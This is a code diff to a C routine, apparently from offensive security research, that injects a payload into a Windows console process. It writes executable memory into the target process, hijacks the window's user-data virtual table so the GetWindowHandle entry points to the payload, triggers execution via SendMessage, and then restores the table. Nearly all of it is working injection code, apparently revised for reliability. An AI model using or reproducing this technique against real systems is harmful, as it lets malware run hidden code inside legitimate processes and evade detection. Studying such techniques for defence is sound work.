@@ -66,8 +66,10 @@ typedef struct _vftable_t {
     ULONG_PTR     GetWindowRect;
 } ConsoleWindow;
 
+// just here for reference. it's not used here.
 typedef struct _userData_t {
     ULONG_PTR vTable;     // gets replaced with new table pointer
+    ULONG_PTR pUnknown;   // some undefined memory pointer
     HWND      hWnd;
     BYTE      buf[100];   // don't care
 } UserData;
@@ -131,7 +133,6 @@ VOID userDataInject(LPVOID payload, DWORD payloadSize) {
     SIZE_T        wr;
     HANDLE        hp;
     ConsoleWindow cw;
-    UserData      ud;
     LPVOID        cs, ds;
     ULONG_PTR     vTable;
     
@@ -152,35 +153,33 @@ VOID userDataInject(LPVOID payload, DWORD payloadSize) {
       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
     
-    // 5. Read the current user data into local memory
+    // 5. Read the address of current virtual table
     udptr = GetWindowLongPtr(hwnd, GWLP_USERDATA);
     ReadProcessMemory(hp, (LPVOID)udptr, 
-        (LPVOID)&ud, sizeof(UserData), &wr);
+        (LPVOID)&vTable, sizeof(ULONG_PTR), &wr);
     
     // 6. Read the current virtual table into local memory
-    ReadProcessMemory(hp, (LPVOID)ud.vTable, 
+    ReadProcessMemory(hp, (LPVOID)vTable, 
       (LPVOID)&cw, sizeof(ConsoleWindow), &wr);
       
     // 7. Allocate RW memory for the new virtual table
     ds = VirtualAllocEx(hp, NULL, sizeof(ConsoleWindow), 
       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    // 8. update the local copy of virtual table with address of payload
-    //    and write to remote process
+    // 8. update the local copy of virtual table with 
+    //    address of payload and write to remote process
     cw.GetWindowHandle = (ULONG_PTR)cs;
     WriteProcessMemory(hp, ds, &cw, sizeof(ConsoleWindow), &wr); 
 
-    // 9. Update the local copy of user data with address of new virtual table
-    //    and write back to remote process in place of the current one
-    vTable = ud.vTable;        // backup pointer to original
-    ud.vTable = (ULONG_PTR)ds;
-    WriteProcessMemory(hp, (LPVOID)udptr, &ud, sizeof(UserData), &wr); 
+    // 9. Update pointer to virtual table in remote process
+    WriteProcessMemory(hp, (LPVOID)udptr, &ds, 
+      sizeof(ULONG_PTR), &wr); 
 
     // 10. Trigger execution of the payload
     SendMessage(hwnd, WM_SETFOCUS, 0, 0);
 
     // 11. Restore pointer to original virtual table
-    ud.vTable = vTable;
-    WriteProcessMemory(hp, (LPVOID)udptr, &ud, sizeof(UserData), &wr);
+    WriteProcessMemory(hp, (LPVOID)udptr, &vTable, 
+      sizeof(ULONG_PTR), &wr);
     
     // 12. Release memory and close handles
     VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
